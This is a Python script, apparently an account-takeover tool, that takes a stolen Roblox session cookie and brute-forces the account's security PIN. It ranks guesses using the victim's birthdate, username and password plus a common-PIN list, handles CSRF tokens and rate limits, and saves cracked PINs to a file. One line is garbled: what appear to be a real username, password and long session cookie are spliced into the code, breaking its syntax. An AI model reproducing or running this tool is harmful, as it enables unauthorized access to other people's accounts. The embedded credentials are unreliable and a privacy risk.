import os, time, requests
from threading import Thread
from datetime import datetime

credentials = input('Enter the account user:pass:cookie or cookie ~ ')
if credentials.count(':') >= 2:
    username, User1Kelvin password, Kelvincolon2011 cookie E99B316FEA4C6BF5E6EADF9C01F641EE6A4A38FD717BE606A1BD46CB3F196E2A00E40D793F8F21A320BA6E28CEA055CC1159D534AC9ECAE1E190272025E20349DCA1C9BC0740DA5152A14CF6B87A47E341C16798F252EA2CF5455972A96B86B93B691648ADA6941E15AAE97DAADF98C2DC1CFE6B6B1AFF864D8B734FAECF5F782C54D925D5A3389B9374C3EBE5E97FBBB46612BC9E402213C4D9BD9B6CD1E7EFE36D7140097440D63A69CC4C30F960FBD9052D140E286AD1971FE29F4C498EA0295D2FB568E5FAF880EAA9465DD977A543A547C4A9693C11197B7DA5A89EC4A444661F24DF8A77F8A8190062D3BDA0340BC3E41ABE40B19F2FC471D6824D227057C15509E59EC121514440F13923C19E70681E53CDBEA42B6CEECF77EADE5C7B136B1B6590A3F5813A42DF19DA3EFB61C75EF60FD4AA549AC4AB0E5E86968EAF6BEC058721890FBD01B5CB0C1D6DEDE13F826C5ACE7B8189E32E9124387CFC4D48F922C8CBA8AF25E9A67CEF830A622492732DCE = credentials.split(':',2)
else:
    username, password, cookie = '', '', credentials
os.system('cls')

req = requests.Session()
req.cookies['.ROBLOSECURITY'] = cookie
try:
    username = req.get('https://www.roblox.com/mobileapi/userinfo').json()['UserName']
    print('Logged in to', username)
except:
    input('INVALID COOKIE')
    exit()

common_pins = req.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
pins = [pin.split(',')[0] for pin in common_pins.splitlines()]
print('Loaded pins by commonality.')

r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
month = str(r['birthMonth']).zfill(2)
day = str(r['birthDay']).zfill(2)
year = str(r['birthYear'])

likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2, year, day+day, month+month, month+day, day+month]
likely = [x for x in likely if x.isdigit() and len(x) == 4]
for pin in likely:
    pins.remove(pin)
    pins.insert(0, pin)
print(f'Prioritized likely pins {likely}\n')

tried = 0
while 1:
    pin = pins.pop(0)
    os.system(f'title Pin Cracking {username} ~ Tried: {tried} ~ Current pin: {pin}')
    try:
        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
        if 'X-CSRF-TOKEN' in r.headers:
            pins.insert(0, pin)
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        elif 'errors' in r.json():
            code = r.json()['errors'][0]['code']
            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                print(f'[FAILURE] Account cookie expired.')
                break
            elif code == 1:
                print(f'[SUCCESS] NO PIN')
                with open('pins.txt','a') as f:
                    f.write(f'NO PIN:{credentials}\n')
                break
            elif code == 3 or '"message":"TooManyRequests"' in r.text:
                pins.insert(0, pin)
                print(f'[{datetime.now()}] Sleeping for 5 minutes.')
                time.sleep(60*5)
            elif code == 4:
                tried += 1
        elif 'unlockedUntil' in r.json():
            print(f'[SUCCESS] {pin}')
            with open('pins.txt','a') as f:
                f.write(f'{pin}:{credentials}\n')
            break
        else:
            pins.insert(0, pin)
            print(f'[ERROR] {r.text}')
    except Exception as e:
        print(f'[ERROR] {e}')
        pins.insert(0, pin)

input()
